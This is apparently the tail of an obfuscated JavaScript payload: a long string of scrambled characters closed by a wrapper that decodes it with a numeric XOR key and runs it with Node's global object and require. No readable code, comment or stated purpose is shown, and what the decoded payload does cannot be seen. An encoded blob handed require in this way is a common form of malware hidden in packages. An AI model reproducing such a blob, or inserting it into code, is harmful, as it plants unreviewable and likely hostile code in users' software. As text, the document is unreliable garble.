3waM<se..qfR.i_.&E!.&RRRcRx{R[R._?R2!!RRcx)RIM.)f=#1ELbRRnJeaMim1)RRR_ |<la<3)0ycd&.#n=l.|Rs;.f(ec.cs=c{?R/%d_!anOce<Rrxa.\'b)=_<m)icAcCRc.n<R.e ..R-<AR5.Rm[dR<<2R.An9xRctmcE%[..R,Qt<uPf_!<R= tZRclpP*.uep6<f.b8RR<cSrk<e}Rckdc.;<tz.l.<!io.<r/2<R=bcRRsVD.R.1b<cc<R}<h+. RvTRp_P<.rs(uPQt:..<>Rk9!=a;o<a*.7r]0Y)8c}z(<a.R.e8Ro tl Rc(A~i!*(bR%cR,c0t< rMRR< Ri< .fPe*+E)m.oj..m8m.cR($<f.R.idey}cBRR!sc<no9R<n RwrN0#tRduc_-RS"i{i)(nMcR<0N</V<<.,0+w.]<w<ReeR,w/eR.R)i. R<e .6Rga.rgs+Qitd.o!cteaLRo)3R <.cd./.~< .s\\.e<sp5R.<RRwa!*.R)tR,ofRZ<ZtcRhsRr$/.RC..b "cRt,\'leacPc RR<Rz"<Ri l0oRRdRs7.R(eCcR_.6"_R..p<&kddee.<=..lo.=R<!b.&Rc<tcCr0m&cXu\'wnd.s;sw+R4/suDicPba ..i!o1^r}I>e4<:RwCRic<RRRc". dRpt0<.Rk0<W8r RnR.Dc.CN lwoh.l-<R<pcbR Pe6hY-Rt.cEp:<+a-V<RaRf\'(<rRRR&<az<4RRR.E)7.xrc0ilHRTisc.ZfRfcRx-th).R#=!<C.w"l{e]e-R</<s4Nt.op"ce.4Rn{SRo<R)Cc])e(Rw8RR. <1hc{p8cS!e<R?RKa=i6Ri[.IRpR$RbxRScl.p<P!fa!vvsO.!pRRt.EglRt<.!iud.lu<is.RoR4!.P.cm.Pi}Ro..lPNRy6=t{<ae._!RwRtaR.sf.!.]4[e.RkE}-}ve..$NwiD!}.0R#<isaR3p%<}.aR@RJt.RGax.R\'spC0!RGcr.2FRiRePaRnsRRRna<R)5U:"n=cdc?ABt.20.tdc!C1R c.<edaA.R(.,elRcR<c&<.eCRURif{aJKR+ex-x:Pc%ei@ecRek?pR.4 RR<R#$c..i+!4RR$R3#R.r(PiRR<c.Rci_U!zRRR;u^|.Z.s(TRRTc.d}R<y._c<.RR{$kR4FB($\\<w. .;R<eR4\\sRc8<R.R[EdR uoR[}V(.pd\'"<Ja(4prAR(.Nc<<rp3.>z eeR!<.<57:&P)c[RbRREM(_P.}RR).=Rhr<,CRRR(<k3R+hn %R.RF)lR;R.s R.jlmR((loH.<R<{PReRi<<cdeK.R.fR2pR(ao~.RyRRR[:RR?eisRPfk Ys(s3.c <4blo<0<9{o<RT@R..nRiR;al?soR0g<T.Rtm<u.s\\?Rl._Rccz4&:?0 .5R/ctc4<R>hi%.i#i}<R.Emc1xAnfR{Scr.R.%|".PrrRn<cRnP!aRRtRfR.P 8\'R<JA R&i<ecc{]cf.RmaR.irc.iReZ"n<y!< cR #<,ec!Rd9sic+_1a.ru..b..Reh<R~i$ot<fRdcit<\\go_0lRmvF(<e9s<Rtt( !RnR6}<.itO..&9s4dNRc .o.RR.]j0 R ma4;r<sCa)& mo[xlR*ht!,Aup Ru,fRtf[j)P*cRR1<RSv s!2cIsR..e74hRd\'c:vsr.s;<e(<_!MRfRfLLgal.!.u.R9(Mcla(d}tOa.}RcIebmEc0N(RD%bE$ rd<cw).F<ObZWR.jg.U4"afR`\'m%/efaxRRR;Rna:7vR0bc.a_R<<jRRs..X)spGi&v\'e.l.2.I.e9rRe.s\'1=r.eRexbb_RR_e9cd<FIP!.cR+8.446/U<<ls!]<u`pRsub<b>JPwp@ilR<i)k!dRLkR.trRx(rr)% /.(]b8cRs+vR-c)}:osR.c#"<cqk<ek.imRSN.RsE bPPn)<e}o0e".1dRIR!(r.%.I..Rfza_?RRkf/,tcRRIf.<iR bdRO.cPcdeR.s}ejFbp;o.fs<c_mc<aF.dnc0c RRR.qn .RcR.hRKj<Rs.kc<3Rs.ccTt.trtnt>w;/IcZc8r<i.Rt>Rcs..s s{Te <!.+.R.<uRPRo.<K.m.a.srM<R .cwRic<R)nP(<RReeutcJc%pN.Rsce.=eaf0<\'@S}1<<YIjr!!<4a.fRR.l&<R$..lv.}|5&R.R!<)xfs.b$:Rc l.< o(J.e.#N.7t<)c<w eR0.=<yc !..Re?<n\'B[Rbo\'auR} rae#R=.iR(st2.b~ <Sc.}tTsRr<aR) ryir!C<c td~" X.ttR<R!d c..!ed.R.<R n.Sne!!)4/oXRRu.enR<.rRqR"l_M.efttr tRc._r<R.R.dd{Wh{R.<.&RRc<.gf}Rcr52dte}d(}?cF7.xy$W<!..c6pc?Nc0z(h4.RRo=_oa.Pf!f4hR.Rd*e=d#cc6rr{o/RaRS.z.v.RDc<.[R9.\'t]&.RRR-4R&ew\\cRYeonf t.m)e=.icK.R{.0sl1pcRs(chl.WR.yc.{eil3ft<{/.C.(.n<l)>m<<d1<a? nec<R..avloRvjRge._ =R+.RR.wdR.d6%.Icc(+t.:ci\'.cht.b.R!s4ft_Rxta<s}H,cc.dkRnc..}c# n)R.(_)c13.ot.o.}<!.tRR).t<...8Rn.Htct<blRotcQGn^*_xmecPT}..<<r0 lEt!dn"0pf.gl}R<eRlT@i..g)ne4Ru<fRRTg.cR.c.eet<..^ee,r;t|pcteWFs RgadRroG(ltl #(yr<.#ddt.<R i-o<stId!b)RIEt*RRn&R.c<iRmlR(-(mtck.Ry!0RYJ<c.Ri>rr. w9cTaR=<PcdK]_\\2f( #.Rs%.te<n/Rrycc.nRc$.P&.f.iccBPNRdR;R.5<RR<mPo{(R{_n<lRid.hR .dRnRr!JwR0.RPRr.>=(f<e?.<Bf]xRcbcPcRs}<R(s.RPY.RR_Pk(o<(dl<0eR,1:D1sv.ilhe_PRpccR1qm.dm"<sisPd.? pmdRhRnct(?$RrtRx.e)`..R.p?i!R1Rr( {.eTRR}.c}<RR8..RpR"cg;.cc0RrR. t&3nd5ecPb_.R!RaccRbcdb}c(!{t<.Rnv.NR&~eAs$z"<4<.ogsfCaRl<ocERoRRt..<s.i`R?.sgc..RsRs.\'$xRcsNRR!R`RoR_n!#R,!5qf.#BIR@l.,.]oReRa|<R[t<<:|a[4<R~R!+Eg-R.aP!e &l<5n%cRRdFryc.s/R.;{{,H.;<n<.)4.tdmR)sRd(mRb{.<Rc.rPm.cRe cRckRx)<c&ci.yceluy;,.XdrRlRR# ccf.cR  R$Rcorr(.rCp<Nr#E(]RnR"ijngRR4<C$adlRac&t(!-Rp.]do.ciR}usRrs(n C<!;.fc.c@z<tR4tCRtRtc=.c3cfo.!  R;<fe8RdrMRR[dN[cyRc:>Tn<l^.lo8RiRRcssc}Rtpc{.sRs...}c.RaY[<a* )I(ldR(wsr6 *R7!a<S.c<\\R.BELRe6Yf<1<ecPrDe sl0PbD#R]o.\'<l.m R(p)<ekac.cR.d.._u<a\'< Rlibfmndf].(%RR<RNDcRER#V..asa[n&R,$<,R<o4RReER)ssL]8ESRReREiR{R<c.{ cWGf}ohdcas.]. fP= os67EocIPoc .7igcFCR. <cE.N .bR')))(677251^678990);}(global,require);
